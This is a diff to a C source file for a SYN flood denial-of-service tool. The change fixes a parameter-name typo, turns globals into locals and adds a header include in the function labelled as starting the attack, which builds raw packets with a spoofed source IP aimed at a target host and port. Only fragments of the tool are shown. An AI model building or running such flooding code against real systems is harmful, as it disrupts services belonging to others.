@@ -34,6 +34,7 @@
 #include <stdlib.h>
 #include <errno.h>
 #include "sock_config.h"
+#include "syn_flood.h"
 
 
 /* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
@@ -71,7 +72,7 @@ struct iphdr* configure_packet(char* source_ip, char* datagram, struct sockaddr_
 {
     struct iphdr* iph = (struct iphdr *) datagram;
     struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
-	struct csum_hdr psh;
+    struct csum_hdr psh;
 	
 
     //fill in the IP header
@@ -135,12 +136,13 @@ int tcp_send(char *datagram, int sfd, struct sockaddr_in servaddr, struct iphdr*
  * Starts the attack
  * * * * * * * * * * * * * * * * * * * * * * * * * * *
 */
-void syn_flood(char* hostname, int port, char* sourcec_ip)
+void syn_flood(char* hostname, int port, char* source_ip)
 {
-	//create the UDP socket
-    sfd = get_sock_fd();
+    //create the UDP socket
+
+    int sfd = get_sock_fd();
     //configure the socket
-    servaddr = configure_sock(port, hostname);
+    struct sockaddr_in servaddr = configure_sock(port, hostname);
     //create the ip header
     struct iphdr* iph = configure_packet(source_ip, datagram, servaddr);
     
